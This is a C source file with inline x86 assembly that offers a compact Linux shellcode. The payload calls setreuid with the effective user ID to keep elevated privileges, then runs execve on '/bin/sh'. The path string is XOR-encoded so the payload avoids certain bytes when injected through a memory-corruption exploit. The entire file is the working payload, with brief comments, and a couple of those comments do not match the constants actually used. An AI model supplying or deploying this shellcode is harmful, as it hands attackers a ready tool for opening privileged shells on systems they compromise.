/*
 *
 * linux/x86 setreuid(geteuid(),geteuid()),execve("/bin/sh",0,0) 34byte universal shellcode
 *
 * blue9057 root@blue9057.com
 *
 */
int main()
{
    // setreuid(geteuid(),geteuid());
    // execve("/bin/sh",0,0);
    __asm__(""
            "push $0x31;"
            "pop %eax;"
            "cltd;"
            "int $0x80;" // geteuid();
            "mov %eax, %ebx;"
            "mov %eax, %ecx;"
            "push $0x46;" // setreuid(geteuid(),geteuid());
            "pop %eax;"
            "int $0x80;"
            "mov $0xb, %al;"
            "push %edx;"
            // Can't use "push $0x68732f2f;" because of 0x2f forward slash
            // So we change the value to 0x68732f2f ^ 0xffffffff = 0x978cd091 and then xor it to get the original value
            // Same for 0x69622f2f ^ 0xffffffff = 0x969dd0d0
            // "push $0x68732f6e;"
            // "push $0x69622f2f;" "//bin/dash"
            "mov $0x978cd091, %edx;"
            "xor $0xffffffff, %edx;"
            "push %edx;"
            "mov $0x969dd0d0, %edx;"
            "xor $0xffffffff, %edx;"
            "push %edx;"

            // clear out %edx
            "xor %edx, %edx;"

            "mov %esp, %ebx;"
            "mov %edx, %ecx;"
            "int $0x80;" // execve("/bin/sh",0,0);
            "");
}
